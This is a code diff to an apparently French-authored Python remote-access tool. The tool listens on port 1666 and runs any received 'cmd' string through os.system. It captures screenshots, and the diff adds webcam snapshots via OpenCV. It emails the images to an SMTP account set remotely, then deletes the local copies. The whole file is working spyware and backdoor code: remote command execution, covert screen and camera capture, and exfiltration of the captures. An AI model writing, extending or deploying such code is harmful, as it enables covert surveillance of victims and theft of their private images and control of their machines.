@@ -9,19 +9,21 @@ from email import encoders
 
 from PIL import ImageGrab
 
+import cv2
+
 mail = ""
 mailpw = ""
 smtpadr = "smtp.gmail.com"
 smtpport = 587
 
-def rcv():
+def rcvscr():
 	try:
 		print(mail, mailpw, smtpadr, smtpport) 
 		msg = MIMEMultipart()
 		msg['From'] = mail
 		msg['To'] = mail
-		msg['Subject'] = "DATA RCV"
-		body = "DATA RCV"
+		msg['Subject'] = "SCR RCV"
+		body = "SCR RCV"
 		msg.attach(MIMEText(body, 'plain'))
 		filename = "scr.png"
 		attachment = open("scr.png", "rb")
@@ -36,9 +38,35 @@ def rcv():
 		text = msg.as_string()
 		server.sendmail(mail, mail, text)
 		server.quit()
-		print("rcvdata... done !")
+		print("rcv scr... done !")
 	except:
-		print("rcvdata... error !")
+		print("rcv scr... error !")
+
+def rcvcam():
+	try:
+		print(mail, mailpw, smtpadr, smtpport) 
+		msg = MIMEMultipart()
+		msg['From'] = mail
+		msg['To'] = mail
+		msg['Subject'] = "CAM RCV"
+		body = "CAM RCV"
+		msg.attach(MIMEText(body, 'plain'))
+		filename = "cam.png"
+		attachment = open("cam.png", "rb")
+		part = MIMEBase('application', 'octet-stream')
+		part.set_payload((attachment).read())
+		encoders.encode_base64(part)
+		part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+		msg.attach(part)	 
+		server = smtplib.SMTP(smtpadr, smtpport)
+		server.starttls()
+		server.login(mail, mailpw)
+		text = msg.as_string()
+		server.sendmail(mail, mail, text)
+		server.quit()
+		print("rcv cam... done !")
+	except:
+		print("rcv cam... error !")
 
 def scr():
 	try:
@@ -51,6 +79,7 @@ def scr():
 def cleanall():
 	try:
 		cleanscr()
+		cleancam()
 		print("cleaning... done !")
 	except:
 		print("clean... error !")
@@ -61,6 +90,25 @@ def cleanscr():
 		print("cleaning scr files... done !")
 	except:
 		print("pas de screenshot à nettoyer, ou fichier pas accessible.")
+
+def cleancam():
+	try:
+		os.remove("cam.png")
+		print("cleaning cam files... done !")
+	except:
+		print("pas de camshot à nettoyer, ou fichier pas accessible.")
+
+def camshot():
+	try:
+		cam = cv2.VideoCapture(0)
+		retval, frame = cam.read()
+		cv2.imwrite('cam.png', frame)
+		cv2.imshow("cam", frame)
+		cv2.waitKey()
+		cv2.destroyAllWindows()
+		print("camshot... done !")
+	except:
+		print("camshot... error !")
 
 hote = ''
 port = 1666
@@ -86,8 +134,6 @@ while i < 1:
 	elif msg_recu[0:3] == b"cmd":
 		print(msg_recu.decode()[4:len(msg_recu)])
 		os.system(msg_recu.decode()[4:len(msg_recu)])
-	elif msg_recu == b"scr":
-		scr()
 	elif msg_recu[0:5] == b"mail ":
 		mail = msg_recu.decode()[5:len(msg_recu)]
 		os.system("cls")
@@ -105,10 +151,14 @@ while i < 1:
 			pass
 		os.system("cls")
 	elif msg_recu == b"rcv":
-		rcv()
-		cleanall()
+		rcvscr()
+		rcvcam()
 	elif msg_recu == b"clean":
 		cleanall()
+	elif msg_recu == b"scr":
+		scr()
+	elif msg_recu == b"camshot":
+		camshot()
 
 
 
